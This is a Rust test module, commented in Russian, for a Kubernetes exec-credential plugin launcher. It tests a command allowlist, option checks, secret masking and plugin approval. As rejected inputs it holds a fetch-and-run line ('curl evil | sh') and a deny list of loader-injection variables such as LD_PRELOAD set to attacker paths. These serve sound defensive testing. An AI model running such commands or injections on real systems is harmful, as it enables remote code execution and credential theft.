    /// Список разрешённых команд (спец. §5.2): имя и первые аргументы.
    #[test]
    fn allowlist_table() {
        let allowed = [
            (
                "/usr/local/bin/aws",
                &[
                    "--region",
                    "eu-west-1",
                    "eks",
                    "get-token",
                    "--cluster-name",
                    "c",
                ][..],
            ),
            (
                "/usr/local/bin/aws",
                &["--profile=dev", "eks", "get-token"][..],
            ),
            ("/usr/bin/aws-iam-authenticator", &["token", "-i", "c"][..]),
            ("/opt/gcloud/bin/gke-gcloud-auth-plugin", &[][..]),
            (
                "/opt/homebrew/bin/kubelogin",
                &["get-token", "--login", "azurecli", "--server-id", "x"][..],
            ),
            (
                "/usr/local/bin/kubectl",
                &["oidc-login", "get-token", "--oidc-issuer-url=https://dex"][..],
            ),
            (
                "/usr/local/bin/oc",
                &["get-token", "--issuer-url=https://x"][..],
            ),
            (
                "/home/u/yandex-cloud/bin/yc",
                &["k8s", "create-token", "--profile=default"][..],
            ),
            (
                "/usr/local/bin/rancher",
                &["token", "--server=rancher.corp"][..],
            ),
        ];
        for (cmd, a) in allowed {
            assert_eq!(check_allowed(cmd, &args(a)), Ok(()), "{cmd} {a:?}");
        }
        let rejected = [
            (
                "/bin/sh",
                &["-c", "curl evil | sh"][..],
                "errors.exec.notAllowed",
            ),
            (
                "/usr/bin/python3",
                &["get-token"][..],
                "errors.exec.notAllowed",
            ),
            (
                "/usr/local/bin/kubectl",
                &["get", "pods"][..],
                "errors.exec.argsNotAllowed",
            ),
            (
                "/usr/local/bin/kubectl",
                &["oidc-login"][..],
                "errors.exec.argsNotAllowed",
            ),
            (
                "/usr/local/bin/aws",
                &["s3", "ls"][..],
                "errors.exec.argsNotAllowed",
            ),
            ("/usr/local/bin/oc", &[][..], "errors.exec.argsNotAllowed"),
            (
                "/usr/local/bin/kubectl-evil",
                &["oidc-login", "get-token"][..],
                "errors.exec.notAllowed",
            ),
        ];
        for (cmd, a, key) in rejected {
            assert_eq!(
                check_allowed(cmd, &args(a)).unwrap_err().key,
                key,
                "{cmd} {a:?}"
            );
        }
        let e = check_allowed("/usr/local/bin/kubectl", &args(&["get"])).unwrap_err();
        assert_eq!(e.params["expected"], "kubectl oidc-login get-token");
    }

    /// Ведущие ключи — только из таблицы команды: ключ со значением (`--ключ значение` или
    /// `--ключ=значение`) или флаг без `=`; любой другой — отказ с именем ключа.
    #[test]
    fn leading_options_follow_the_table_of_the_command() {
        let accepted = [
            (
                "/usr/local/bin/aws",
                &["--no-verify-ssl", "eks", "get-token"][..],
            ),
            ("/usr/local/bin/aws", &["--debug", "eks", "get-token"][..]),
            (
                "/usr/local/bin/aws",
                &["--region", "eu-west-1", "eks", "get-token"][..],
            ),
            (
                "/usr/local/bin/aws",
                &["--region=eu-west-1", "eks", "get-token"][..],
            ),
            (
                "/usr/local/bin/aws",
                &[
                    "--debug",
                    "--profile",
                    "dev",
                    "--output=json",
                    "--no-cli-pager",
                    "eks",
                    "get-token",
                    "--cluster-name",
                    "c",
                    "--unknown-after-the-subcommand",
                ][..],
            ),
            (
                "/usr/local/bin/oc",
                &[
                    "--request_timeout",
                    "5s",
                    "--loglevel=8",
                    "-n",
                    "team-a",
                    "--insecure-skip-tls-verify",
                    "get-token",
                ][..],
            ),
            (
                "/usr/local/bin/yc",
                &[
                    "--profile",
                    "prod",
                    "--folder-id",
                    "b1g",
                    "--debug",
                    "k8s",
                    "create-token",
                ][..],
            ),
            ("/usr/local/bin/rancher", &["-c", "/r", "token"][..]),
            (
                "/usr/local/bin/rancher",
                &["--config", "/r", "-debug", "token"][..],
            ),
            (
                "/usr/local/bin/aws-iam-authenticator",
                &["-i", "c", "token"][..],
            ),
            ("/usr/local/bin/kubelogin", &["-v", "4", "get-token"][..]),
            ("/opt/gcloud/bin/gke-gcloud-auth-plugin", &["--", "x"][..]),
        ];
        for (cmd, a) in accepted {
            assert_eq!(check_allowed(cmd, &args(a)), Ok(()), "{cmd} {a:?}");
        }
        // Незнакомый ведущий ключ — отказ в любой записи: от того, берёт ли он значение,
        // зависит, какую подкоманду запустит утилита.
        let unknown = [
            // На деле — плагин `oc-evil` или встроенная команда.
            (
                "/usr/local/bin/oc",
                &["--x", "evil", "get-token"][..],
                "--x",
            ),
            ("/usr/local/bin/oc", &["--x", "get-token"][..], "--x"),
            (
                "/usr/local/bin/aws",
                &["--unknown-opt", "value", "eks", "get-token"][..],
                "--unknown-opt",
            ),
            (
                "/usr/local/bin/aws",
                &["--unknown=x", "eks", "get-token"][..],
                "--unknown",
            ),
            // Сокращение argparse — тоже незнакомый ключ.
            (
                "/usr/local/bin/aws",
                &["--reg", "eu-west-1", "eks", "get-token"][..],
                "--reg",
            ),
            // `_` вместо `-` понимает только oc.
            (
                "/usr/local/bin/aws",
                &["--endpoint_url", "http://x", "eks", "get-token"][..],
                "--endpoint_url",
            ),
            // Короткие ключи слитно (`-nteam`) и `--`, `-` перед подкомандой.
            ("/usr/local/bin/oc", &["-nteam", "get-token"][..], "-nteam"),
            (
                "/usr/local/bin/aws",
                &["--debug", "--", "eks", "get-token"][..],
                "--",
            ),
            ("/usr/local/bin/oc", &["-", "get-token"][..], "-"),
            (
                "/usr/local/bin/kubelogin",
                &["--logtostderr", "get-token"][..],
                "--logtostderr",
            ),
            // Только у AWS CLI v2, и к получению токена отношения не имеет.
            (
                "/usr/local/bin/aws",
                &[
                    "--cli-binary-format",
                    "raw-in-base64-out",
                    "eks",
                    "get-token",
                ][..],
                "--cli-binary-format",
            ),
        ];
        for (cmd, a, option) in unknown {
            let e = check_allowed(cmd, &args(a)).unwrap_err();
            assert_eq!(
                (e.key.as_str(), e.params["option"].as_str()),
                ("errors.exec.unknownOption", option),
                "{cmd} {a:?}"
            );
        }
        let e =
            check_allowed("/usr/local/bin/oc", &args(&["--x", "evil", "get-token"])).unwrap_err();
        assert_eq!(
            (
                e.params["command"].as_str(),
                e.params["subcommand"].as_str(),
                e.params["expected"].as_str()
            ),
            ("oc", "get-token", "oc get-token")
        );
        // Значение после `=` в текст отказа не попадает.
        let e = check_allowed(
            "/usr/local/bin/aws",
            &args(&["--client-secret=s3cr3t", "eks", "get-token"]),
        )
        .unwrap_err();
        assert_eq!(e.params["option"], "--client-secret");
        assert!(!e.text.contains("s3cr3t"), "{}", e.text);

        // Флаг со значением через `=`.
        for (cmd, a, option) in [
            (
                "/usr/local/bin/aws",
                &["--debug=true", "eks", "get-token"][..],
                "--debug",
            ),
            (
                "/usr/local/bin/oc",
                &["--insecure-skip-tls-verify=true", "get-token"][..],
                "--insecure-skip-tls-verify",
            ),
        ] {
            let e = check_allowed(cmd, &args(a)).unwrap_err();
            assert_eq!(
                (e.key.as_str(), e.params["option"].as_str()),
                ("errors.exec.flagWithValue", option),
                "{cmd} {a:?}"
            );
        }

        // Ключи в порядке, не та подкоманда — обычный отказ.
        for (cmd, a) in [
            (
                "/usr/local/bin/aws",
                &["--region", "eu-west-1", "s3", "ls"][..],
            ),
            // Значение ключа — не подкоманда: здесь подкоманда — `get-token`.
            ("/usr/local/bin/aws", &["--region", "eks", "get-token"][..]),
            ("/usr/local/bin/aws", &["--region"][..]),
            (
                "/usr/local/bin/oc",
                &["--insecure-skip-tls-verify", "exec"][..],
            ),
        ] {
            let e = check_allowed(cmd, &args(a)).unwrap_err();
            assert_eq!(e.key, "errors.exec.argsNotAllowed", "{cmd} {a:?}");
        }
    }

    /// kubectl запускает плагин, только если перед его именем нет ключей, поэтому ведущих ключей
    /// у `kubectl oidc-login` нет вовсе: флаг перед встроенной командой запустил бы её.
    #[test]
    fn kubectl_takes_no_options_before_the_plugin() {
        for (a, option) in [
            (
                &[
                    "--insecure-skip-tls-verify",
                    "exec",
                    "oidc-login",
                    "get-token",
                ][..],
                "--insecure-skip-tls-verify",
            ),
            (
                &["--kubeconfig", "/x", "oidc-login", "get-token"][..],
                "--kubeconfig",
            ),
            (&["--token=abc", "oidc-login", "get-token"][..], "--token"),
            (&["-v", "9", "oidc-login", "get-token"][..], "-v"),
            (&["--", "oidc-login", "get-token"][..], "--"),
        ] {
            let e = check_allowed("/usr/local/bin/kubectl", &args(a)).unwrap_err();
            assert_eq!(
                (e.key.as_str(), e.params["option"].as_str()),
                ("errors.exec.optionBeforePlugin", option),
                "{a:?}"
            );
            assert!(!e.text.contains("abc"), "{}", e.text);
        }
        assert_eq!(
            check_allowed(
                "/usr/local/bin/kubectl",
                &args(&["oidc-login", "get-token", "--kubeconfig", "/x", "-v", "9"])
            ),
            Ok(()),
            "ключи после имени плагина — его ключи"
        );
    }

    #[test]
    fn loader_and_interpreter_variables_are_forbidden() {
        for name in [
            "PATH",
            "LD_PRELOAD",
            "LD_LIBRARY_PATH",
            "LD_AUDIT",
            "DYLD_INSERT_LIBRARIES",
            "DYLD_LIBRARY_PATH",
            "NODE_OPTIONS",
            "NODE_PATH",
            "PYTHONPATH",
            "PYTHONHOME",
            "PYTHONSTARTUP",
            "PYTHONUSERBASE",
            "PERL5LIB",
            "PERL5OPT",
            "PERLLIB",
            "RUBYOPT",
            "RUBYLIB",
            "BASH_ENV",
            "ENV",
            "SHELLOPTS",
            "BASH_FUNC_aws%%",
            "JAVA_TOOL_OPTIONS",
            "_JAVA_OPTIONS",
            "JDK_JAVA_OPTIONS",
            "GCONV_PATH",
            "PATHEXT",
            "COMSPEC",
        ] {
            assert!(is_forbidden_env(name), "{name}");
        }
        for name in [
            "AWS_PROFILE",
            "AWS_CONFIG_FILE",
            "AWS_REGION",
            "HTTPS_PROXY",
            "NO_PROXY",
            "KUBECONFIG",
            "HOME",
            "SSL_CERT_FILE",
            "NODE_EXTRA_CA_CERTS",
            "MY_PATH",
            "PATH_EXTRA",
            "OLD_LD_PRELOAD",
            "ENVIRONMENT",
        ] {
            assert!(!is_forbidden_env(name), "{name}");
        }
        // На Windows регистр в именах не различается: `Path` — это `PATH`; в unix это другая
        // переменная.
        for name in [
            "Path",
            "path",
            "PathExt",
            "ComSpec",
            "ld_preload",
            "Node_Options",
            "PythonPath",
        ] {
            assert_eq!(is_forbidden_env(name), cfg!(windows), "{name}");
        }

        assert_eq!(check_env(&sample_exec().env), Ok(()));
        let env = [
            ExecEnv {
                name: "AWS_PROFILE".into(),
                value: "dev".into(),
            },
            ExecEnv {
                name: "LD_PRELOAD".into(),
                value: "/tmp/x.so".into(),
            },
        ];
        let e = check_env(&env).unwrap_err();
        assert_eq!(
            (e.key.as_str(), e.params["name"].as_str()),
            ("errors.exec.envForbidden", "LD_PRELOAD")
        );
    }

    #[test]
    fn command_names() {
        assert_eq!(command_name("/usr/local/bin/kubelogin"), "kubelogin");
        assert_eq!(command_name("kubelogin.exe"), "kubelogin");
        assert_eq!(command_name("aws.EXE"), "aws");
        assert_eq!(command_name(""), "");
    }

    #[test]
    fn secret_like_names() {
        for s in [
            "AWS_SECRET_ACCESS_KEY",
            "AWS_SESSION_TOKEN",
            "OIDC_PASSWORD",
            "api_key",
            "DB_PASSWD",
            "OIDC_PASSPHRASE",
            "PASS",
            "AUTH_BEARER",
            "SESSION_COOKIE",
            "GOOGLE_APPLICATION_CREDENTIALS",
            "oidc-client-secret",
        ] {
            assert!(is_secret_name(s), "{s}");
        }
        for s in [
            "AWS_PROFILE",
            "AWS_REGION",
            "HTTPS_PROXY",
            "KUBECONFIG",
            "PATH",
            "HOME",
            "oidc-issuer-url",
        ] {
            assert!(!is_secret_name(s), "{s}");
        }
    }

    /// Exec-плагин с секретами в переменной окружения и в аргументах (обе формы записи).
    fn exec_with_secrets() -> ExecAuth {
        let mut e = sample_exec();
        e.env.push(ExecEnv {
            name: "AWS_SECRET_ACCESS_KEY".into(),
            value: "s3cr3t".into(),
        });
        e.args.extend(args(&[
            "--oidc-client-secret=top-secret",
            "--client-secret",
            "pair-secret",
        ]));
        e
    }

    #[test]
    fn secret_argument_values_are_blanked_and_masked() {
        let a = args(&[
            "get-token",
            "--login",
            "spn",
            "--client-secret",
            "pair-secret",
            "--oidc-client-secret=top-secret",
            "-token=short",
            "--server-id=api://x",
            "--region",
            "eu-west-1",
            "--password=",
            "--token-file",
        ]);
        assert_eq!(
            blank_secret_args(&a),
            args(&[
                "get-token",
                "--login",
                "spn",
                "--client-secret",
                "",
                "--oidc-client-secret=",
                "-token=",
                "--server-id=api://x",
                "--region",
                "eu-west-1",
                "--password=",
                "--token-file",
            ]),
            "значение без пары и не-ключи не трогаются"
        );
        assert_eq!(
            mask_secret_args(&a, "***"),
            args(&[
                "get-token",
                "--login",
                "spn",
                "--client-secret",
                "***",
                "--oidc-client-secret=***",
                "-token=***",
                "--server-id=api://x",
                "--region",
                "eu-west-1",
                "--password=***",
                "--token-file",
            ])
        );
        // Позиционное `token` у aws-iam-authenticator — не ключ.
        let b = args(&["token", "-i", "c"]);
        assert_eq!(blank_secret_args(&b), b);
        assert_eq!(blank_secret_args(&[]), Vec::<String>::new());
    }

    #[test]
    fn secret_values_cover_env_and_arguments() {
        let e = exec_with_secrets();
        assert_eq!(secret_values(&e), ["s3cr3t", "top-secret", "pair-secret"]);
        let blanked = ExecAuth {
            env: e
                .env
                .iter()
                .map(|v| ExecEnv {
                    name: v.name.clone(),
                    value: if is_secret_name(&v.name) {
                        String::new()
                    } else {
                        v.value.clone()
                    },
                })
                .collect(),
            args: blank_secret_args(&e.args),
            ..e.clone()
        };
        assert!(secret_values(&blanked).is_empty(), "пустые не возвращаются");
        assert!(secret_values(&sample_exec()).is_empty());
    }

    #[test]
    fn local_secrets_fill_empty_incoming_values_only() {
        let local = exec_with_secrets();
        let mut incoming = ExecAuth {
            env: vec![
                local.env[0].clone(),
                ExecEnv {
                    name: "AWS_SECRET_ACCESS_KEY".into(),
                    value: String::new(),
                },
            ],
            args: blank_secret_args(&local.args),
            ..local.clone()
        };
        inherit_secrets(&mut incoming, &local);
        assert_eq!(incoming.env, local.env);
        assert_eq!(incoming.args, local.args);

        // Непустое значение из файла не затирается; секрета без пары среди локальных нет.
        let mut incoming = ExecAuth {
            env: vec![
                ExecEnv {
                    name: "AWS_SECRET_ACCESS_KEY".into(),
                    value: "new".into(),
                },
                ExecEnv {
                    name: "OTHER_TOKEN".into(),
                    value: String::new(),
                },
            ],
            args: args(&["oidc-login", "get-token", "--oidc-client-secret="]),
            ..local.clone()
        };
        inherit_secrets(&mut incoming, &local);
        assert_eq!(incoming.env[0].value, "new");
        assert_eq!(incoming.env[1].value, "");
        assert_eq!(incoming.args[2], "--oidc-client-secret=top-secret");
    }

    #[test]
    fn search_dirs_keep_absolute_directories_only() {
        let path = std::env::join_paths([".", "bin", "../x", "/usr/bin", ""])
            .unwrap()
            .into_string()
            .unwrap();
        let dirs = search_dirs(Some(&path), standard_dirs(Some(Path::new("home")), None));
        assert!(dirs.iter().all(|d| d.is_absolute()), "{dirs:?}");
        if cfg!(unix) {
            assert_eq!(
                dirs,
                ["/usr/bin", "/opt/homebrew/bin", "/usr/local/bin"].map(PathBuf::from),
                "относительные каталоги PATH и домашний каталог без корня отброшены"
            );
        }
    }

    #[test]
    fn relative_command_needs_an_absolute_base() {
        let any = |_: &Path| true;
        assert_eq!(
            resolve_command("bin/plugin", Some(Path::new("kube")), &[], &any),
            None
        );
        assert_eq!(resolve_command("bin/plugin", None, &[], &any), None);
    }

    #[test]
    fn approval_follows_the_launch_line() {
        let mut e = sample_exec();
        assert!(!is_approved(&e));
        e.approved = Some(fingerprint(&e));
        assert!(is_approved(&e));
        let fp = fingerprint(&e);
        assert_eq!(fp.len(), 64);
        for change in [
            |e: &mut ExecAuth| e.command = "/opt/homebrew/bin/kubectl".into(),
            |e: &mut ExecAuth| e.args.push("--v=1".into()),
            |e: &mut ExecAuth| {
                e.env.push(ExecEnv {
                    name: "X".into(),
                    value: "1".into(),
                })
            },
            |e: &mut ExecAuth| e.env[0].value = "http://other:3128".into(),
            |e: &mut ExecAuth| e.provide_cluster_info = true,
            |e: &mut ExecAuth| e.api_version = crate::storage::profile::EXEC_API_V1BETA1.into(),
        ] {
            let mut changed = e.clone();
            change(&mut changed);
            assert!(!is_approved(&changed), "{changed:?}");
        }
    }

    #[test]
    fn command_resolution() {
        let files = [
            PathBuf::from("/opt/homebrew/bin/kubelogin"),
            PathBuf::from("/home/u/.kube/bin/plugin"),
            PathBuf::from("/usr/bin/aws"),
        ];
        let is_file = |p: &Path| files.iter().any(|f| f == p);
        let dirs = search_dirs(
            Some("/usr/bin:/bin"),
            standard_dirs(Some(Path::new("/home/u")), None),
        );
        if cfg!(unix) {
            assert_eq!(
                dirs,
                [
                    "/usr/bin",
                    "/bin",
                    "/opt/homebrew/bin",
                    "/usr/local/bin",
                    "/home/u/.local/bin"
                ]
                .map(PathBuf::from)
            );
            assert_eq!(
                resolve_command("kubelogin", None, &dirs, &is_file),
                Some(PathBuf::from("/opt/homebrew/bin/kubelogin"))
            );
            assert_eq!(
                resolve_command("aws", None, &dirs, &is_file),
                Some(PathBuf::from("/usr/bin/aws")),
                "PATH раньше стандартных каталогов"
            );
            assert_eq!(
                resolve_command(
                    "bin/plugin",
                    Some(Path::new("/home/u/.kube")),
                    &dirs,
                    &is_file
                ),
                Some(PathBuf::from("/home/u/.kube/bin/plugin")),
                "относительный путь — от каталога kubeconfig"
            );
            assert_eq!(
                resolve_command("/usr/bin/aws", None, &[], &is_file),
                Some(PathBuf::from("/usr/bin/aws"))
            );
        }
        assert_eq!(
            resolve_command("gke-gcloud-auth-plugin", None, &dirs, &is_file),
            None
        );
        assert_eq!(resolve_command(" ", None, &dirs, &is_file), None);
    }

    #[cfg(unix)]
    #[test]
    fn only_executable_regular_files_are_commands() {
        let dir = tempfile::tempdir().unwrap();
        let (plain, exe) = (dir.path().join("plain"), dir.path().join("exe"));
        write_test_file(&plain, 0o644);
        write_test_file(&exe, 0o755);
        assert!(!is_executable_file(&plain), "без бита исполнения");
        assert!(is_executable_file(&exe));
        assert!(
            !is_executable_file(dir.path()),
            "каталог с битом x — не команда"
        );
        assert!(!is_executable_file(&dir.path().join("missing")));
    }

    #[test]
    fn credentials_from_plugin_output() {
        use secrecy::ExposeSecret;
        let c = parse_credential(
            br#"{"apiVersion":"client.authentication.k8s.io/v1","kind":"ExecCredential",
                "status":{"token":" t1 ","expirationTimestamp":"2030-01-01T00:00:00Z"}}"#,
        )
        .unwrap();
        assert_eq!(c.token.unwrap().expose_secret(), "t1");
        assert_eq!(
            c.expires_at.unwrap(),
            SystemTime::UNIX_EPOCH + Duration::from_secs(1_893_456_000)
        );
        let c = parse_credential(
            br#"{"status":{"clientCertificateData":"CERT","clientKeyData":"KEY"}}"#,
        )
        .unwrap();
        assert!(c.token.is_none() && c.expires_at.is_none());
        assert_eq!(c.client_certificate_pem.as_deref(), Some("CERT"));
        for bad in [
            &b"not json"[..],
            br#"{"kind":"ExecCredential"}"#,
            br#"{"status":{"token":""}}"#,
            br#"{"status":{"clientCertificateData":"CERT"}}"#,
            br#"{"status":{"token":"t","expirationTimestamp":"tomorrow"}}"#,
        ] {
            assert!(
                parse_credential(bad).is_err(),
                "{}",
                String::from_utf8_lossy(bad)
            );
        }
    }

    /// Причина отказа разбирает форму вывода и называет поле, но не повторяет значения:
    /// ошибка `serde` содержит значение, не подошедшее по типу (`invalid type: string "…"`).
    #[test]
    fn bad_credential_reasons_never_echo_values() {
        let secret = "opaque-t0ken-value";
        for (bad, field) in [
            (format!(r#"{{"status":"{secret}"}}"#), "status"),
            (format!(r#"{{"status":{{"token":["{secret}"]}}}}"#), "token"),
            (
                format!(r#"{{"status":{{"token":{{"v":"{secret}"}}}}}}"#),
                "token",
            ),
            (
                format!(r#"{{"status":{{"clientKeyData":12345,"token":"{secret}"}}}}"#),
                "clientKeyData",
            ),
            (
                format!(r#"{{"status":{{"token":"t","expirationTimestamp":"{secret}"}}}}"#),
                "expirationTimestamp",
            ),
            (
                format!(r#"{{"status":{{"token":"t","expirationTimestamp":["{secret}"]}}}}"#),
                "expirationTimestamp",
            ),
            (format!(r#"["{secret}"]"#), "JSON object"),
            (format!("{secret} not json"), "line 1"),
        ] {
            let reason = parse_credential(bad.as_bytes()).unwrap_err();
            assert!(!reason.contains(secret), "{bad}: {reason}");
            assert!(reason.contains(field), "{bad}: {reason}");
        }
        for (bad, reason) in [
            (r#"{"kind":"ExecCredential"}"#, "no status"),
            (r#"{"status":null}"#, "no status"),
            (r#"{"status":{"token":""}}"#, "neither token"),
        ] {
            let got = parse_credential(bad.as_bytes()).unwrap_err();
            assert!(got.contains(reason), "{bad}: {got}");
        }
    }

    /// Единая проверка подтверждения: её используют и запуск, и проверка подключения.
    #[test]
    fn unapproved_launch_line_is_refused_in_one_place() {
        let mut e = sample_exec();
        let err = require_approved(&e).unwrap_err();
        assert_eq!(
            (err.code, err.key.as_str()),
            (ErrorCode::AuthFailed, "errors.exec.notApproved")
        );
        e.approved = Some(fingerprint(&e));
        assert!(require_approved(&e).is_ok());
        e.args.push("--v=1".into());
        assert_eq!(
            require_approved(&e).unwrap_err().key,
            "errors.exec.notApproved"
        );
    }

    #[test]
    fn plugin_output_is_masked() {
        let text = "error: token eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1In0.c2lnbmF0dXJl expired\n\
                    Authorization: Bearer abc.def\nsha256~Zm9vYmFy\nsecret=hunter22";
        let m = mask_output(text, &["hunter22"]);
        for leaked in ["eyJhbGci", "abc.def", "Zm9vYmFy", "hunter22"] {
            assert!(!m.contains(leaked), "{leaked}: {m}");
        }
        assert!(m.contains("Bearer ***") && m.contains("sha256~***"), "{m}");
        let long = "x".repeat(5000);
        assert_eq!(mask_output(&long, &[]).chars().count(), 2001);
    }

    #[test]
    fn exec_info_has_cluster_only_on_request() {
        let mut p = crate::storage::profile::sample_profile("a");
        let mut e = sample_exec();
        let v: serde_json::Value = serde_json::from_str(&exec_info(&e, &p)).unwrap();
        assert_eq!(v["kind"], "ExecCredential");
        assert_eq!(v["apiVersion"], "client.authentication.k8s.io/v1");
        assert_eq!(v["spec"]["interactive"], false);
        assert!(v["spec"]["cluster"].is_null());
        e.provide_cluster_info = true;
        p.ca = CaConfig::Pem { pem: "PEM".into() };
        let v: serde_json::Value = serde_json::from_str(&exec_info(&e, &p)).unwrap();
        assert_eq!(
            v["spec"]["cluster"]["server"],
            "https://api.dev.example.com:6443"
        );
        assert_eq!(v["spec"]["cluster"]["certificate-authority-data"], "UEVN");
    }

    /// Плагины в тестах — скрипт `sh` с именем `kubectl` (`oidc-login get-token <режим>`).
    #[cfg(unix)]
    mod running {
        use super::*;

        const SCRIPT: &str = r#"#!/bin/sh
case "$3" in
  ok) printf '{"kind":"ExecCredential","status":{"token":"tok-%s","expirationTimestamp":"2030-01-01T00:00:00Z"}}' "$TEAM" ;;
  info) printf '%s' "$KUBERNETES_EXEC_INFO" > "$INFO_FILE"; printf '{"status":{"token":"t"}}' ;;
  path) printf '{"status":{"token":"%s"}}' "$PATH" ;;
  fail) echo "refresh token eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1In0.c2lnbmF0dXJl expired, key $AWS_SECRET_ACCESS_KEY, args $*" >&2; exit 3 ;;
  slow) sleep 30 ;;
  orphan) sleep 30 & echo $! > "$PID_FILE"; sleep 30 ;;
  garbage) echo "not json" ;;
  wrongtype) printf '{"status":"opaque-t0ken-value"}' ;;
esac
"#;

        fn plugin(dir: &Path, mode: &str) -> ExecAuth {
            use std::os::unix::fs::PermissionsExt;
            let path = dir.join("kubectl");
            std::fs::write(&path, SCRIPT).unwrap();
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
            ExecAuth {
                command: path.display().to_string(),
                args: vec!["oidc-login".into(), "get-token".into(), mode.into()],
                env: vec![
                    ExecEnv {
                        name: "TEAM".into(),
                        value: "a".into(),
                    },
                    ExecEnv {
                        name: "AWS_SECRET_ACCESS_KEY".into(),
                        value: "s3cr3t-value".into(),
                    },
                ],
                ..sample_exec()
            }
        }

        async fn go(e: &ExecAuth, limit: Duration) -> AppResult<PluginCredential> {
            let (_keep, cancel) = oneshot::channel();
            run(e, "{}", None, cancel, limit).await
        }

        #[tokio::test]
        async fn token_env_and_expiry() {
            use secrecy::ExposeSecret;
            let dir = tempfile::tempdir().unwrap();
            let c = go(&plugin(dir.path(), "ok"), Duration::from_secs(10))
                .await
                .unwrap();
            assert_eq!(c.token.unwrap().expose_secret(), "tok-a");
            assert!(c.expires_at.is_some());
        }

        #[tokio::test]
        async fn exec_info_and_path_reach_the_plugin() {
            use secrecy::ExposeSecret;
            let dir = tempfile::tempdir().unwrap();
            let info_file = dir.path().join("info.json");
            let mut e = plugin(dir.path(), "info");
            e.env.push(ExecEnv {
                name: "INFO_FILE".into(),
                value: info_file.display().to_string(),
            });
            let (_keep, cancel) = oneshot::channel();
            run(
                &e,
                r#"{"kind":"ExecCredential"}"#,
                None,
                cancel,
                Duration::from_secs(10),
            )
            .await
            .unwrap();
            assert_eq!(
                std::fs::read_to_string(&info_file).unwrap(),
                r#"{"kind":"ExecCredential"}"#
            );
            let e = plugin(dir.path(), "path");
            let (_keep, cancel) = oneshot::channel();
            let c = run(
                &e,
                "{}",
                Some("/opt/x/bin:/usr/bin:/bin"),
                cancel,
                Duration::from_secs(10),
            )
            .await
            .unwrap();
            assert_eq!(c.token.unwrap().expose_secret(), "/opt/x/bin:/usr/bin:/bin");
            let dirs = [PathBuf::from("/usr/bin")];
            assert_eq!(
                plugin_path(Path::new("/opt/homebrew/bin/kubectl"), &dirs).as_deref(),
                Some("/opt/homebrew/bin:/usr/bin")
            );
        }

        #[tokio::test]
        async fn failure_reports_exit_code_and_masked_stderr() {
            let dir = tempfile::tempdir().unwrap();
            let e = go(&plugin(dir.path(), "fail"), Duration::from_secs(10))
                .await
                .unwrap_err();
            assert_eq!(
                (e.code, e.key.as_str()),
                (ErrorCode::AuthFailed, "errors.exec.failed")
            );
            assert_eq!(e.params["code"], "3");
            let details = e.details.unwrap();
            assert!(details.contains("refresh token *** expired"), "{details}");
            assert!(!details.contains("s3cr3t-value"), "{details}");
            let e = go(&plugin(dir.path(), "garbage"), Duration::from_secs(10))
                .await
                .unwrap_err();
            assert_eq!(e.key, "errors.exec.badOutput");
        }

        /// Секретные аргументы (`--имя=значение` и пара `--имя значение`) в stderr плагина
        /// маскируются так же, как значения секретных переменных окружения.
        #[tokio::test]
        async fn failure_masks_secret_arguments() {
            let dir = tempfile::tempdir().unwrap();
            for (extra, secret, shown) in [
                (
                    &["--oidc-client-secret=cl1ent-s3cret"][..],
                    "cl1ent-s3cret",
                    "--oidc-client-secret=***",
                ),
                (
                    &["--client-secret", "pair-s3cret"][..],
                    "pair-s3cret",
                    "--client-secret ***",
                ),
            ] {
                let mut e = plugin(dir.path(), "fail");
                e.args.extend(extra.iter().map(|a| a.to_string()));
                let err = go(&e, Duration::from_secs(10)).await.unwrap_err();
                assert_eq!(err.key, "errors.exec.failed");
                let details = err.details.unwrap();
                assert!(!details.contains(secret), "{details}");
                assert!(details.contains(shown), "{details}");
                assert!(!details.contains("s3cr3t-value"), "{details}");
            }
        }

        /// Вывод плагина не по формату: причина называет поле, но не значение.
        #[tokio::test]
        async fn bad_output_reason_has_no_values() {
            let dir = tempfile::tempdir().unwrap();
            let err = go(&plugin(dir.path(), "wrongtype"), Duration::from_secs(10))
                .await
                .unwrap_err();
            assert_eq!(err.key, "errors.exec.badOutput");
            let details = err.details.unwrap();
            assert!(details.contains("status"), "{details}");
            assert!(!details.contains("opaque-t0ken-value"), "{details}");
        }

        /// Профиль поправили в обход проверки: PATH и переменные загрузчика и интерпретаторов
        /// не доходят до процесса, ключ-флаг не прячет подкоманду — плагин не запускается.
        #[tokio::test]
        async fn forbidden_environment_and_arguments_are_refused_before_start() {
            let dir = tempfile::tempdir().unwrap();
            let marker = dir.path().join("info.json");
            let started = |e: &mut ExecAuth| {
                e.env.push(ExecEnv {
                    name: "INFO_FILE".into(),
                    value: marker.display().to_string(),
                });
            };
            for name in [
                "PATH",
                "LD_PRELOAD",
                "DYLD_INSERT_LIBRARIES",
                "NODE_OPTIONS",
                "PYTHONPATH",
            ] {
                let mut e = plugin(dir.path(), "info");
                started(&mut e);
                e.env.push(ExecEnv {
                    name: name.into(),
                    value: "/tmp/evil".into(),
                });
                let err = go(&e, Duration::from_secs(10)).await.unwrap_err();
                assert_eq!(
                    (err.code, err.key.as_str()),
                    (ErrorCode::AuthFailed, "errors.exec.envForbidden"),
                    "{name}"
                );
                assert_eq!(err.params["name"], name);
                assert!(!marker.exists(), "{name}: плагин запущен");
            }
            let mut e = plugin(dir.path(), "info");
            started(&mut e);
            e.args.insert(0, "--insecure-skip-tls-verify".into());
            e.args.insert(1, "exec".into());
            let err = go(&e, Duration::from_secs(10)).await.unwrap_err();
            assert_eq!(err.key, "errors.exec.optionBeforePlugin");
            assert!(!marker.exists(), "плагин запущен");
            // Та же строка без лишнего — запускается: проверка выше не случайна.
            let mut e = plugin(dir.path(), "info");
            started(&mut e);
            go(&e, Duration::from_secs(10)).await.unwrap();
            assert!(marker.exists());
        }

        /// Относительная команда не запускается, даже если имя из списка разрешённых.
        #[tokio::test]
        async fn relative_command_is_not_started() {
            let dir = tempfile::tempdir().unwrap();
            for command in ["kubectl", "bin/kubectl", "./kubectl", ""] {
                let e = ExecAuth {
                    command: command.into(),
                    ..plugin(dir.path(), "ok")
                };
                let err = go(&e, Duration::from_secs(10)).await.unwrap_err();
                assert_eq!(
                    (err.code, err.key.as_str()),
                    (ErrorCode::AuthFailed, "errors.exec.commandNotAbsolute"),
                    "{command:?}"
                );
                assert_eq!(err.params["command"], command);
            }
        }

        #[tokio::test]
        async fn timeout_and_cancel_stop_the_plugin() {
            let dir = tempfile::tempdir().unwrap();
            let e = plugin(dir.path(), "slow");
            let started = std::time::Instant::now();
